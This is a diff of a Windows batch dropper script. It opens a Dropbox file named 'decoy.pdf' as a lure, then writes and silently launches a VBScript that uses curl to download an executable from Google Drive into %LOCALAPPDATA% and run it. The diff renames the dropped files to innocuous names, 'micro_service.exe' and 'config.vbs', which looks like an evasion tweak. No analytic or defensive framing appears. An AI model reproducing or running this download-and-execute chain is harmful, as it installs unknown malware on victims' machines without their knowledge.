@@ -1,4 +1,4 @@
 start "" /min "https://www.dropbox.com/scl/fi/wzo8gx16236hk4quqrvo0/decoy.pdf?rlkey=0d7mzierq005gojj72aaykx85&st=p5t2rjie&dl=0"
-echo CreateObject("WScript.Shell").Run "cmd /c curl -L -o ""%LOCALAPPDATA%\d.exe"" ""https://drive.google.com/uc?export=download&id=1yx5XS4owmr__2ajnQ1wKk0HZZC61X67Q"" && ""%LOCALAPPDATA%\d.exe""", 0, False > "%LOCALAPPDATA%\abc.vbs"
-start "" /min  "%LOCALAPPDATA%\abc.vbs"
+echo CreateObject("WScript.Shell").Run "cmd /c curl -L -o ""%LOCALAPPDATA%\micro_service.exe"" ""https://drive.google.com/uc?export=download&id=1yx5XS4owmr__2ajnQ1wKk0HZZC61X67Q"" && ""%LOCALAPPDATA%\micro_service.exe""", 0, False > "%LOCALAPPDATA%\config.vbs"
+start "" /min  "%LOCALAPPDATA%\config.vbs"
 
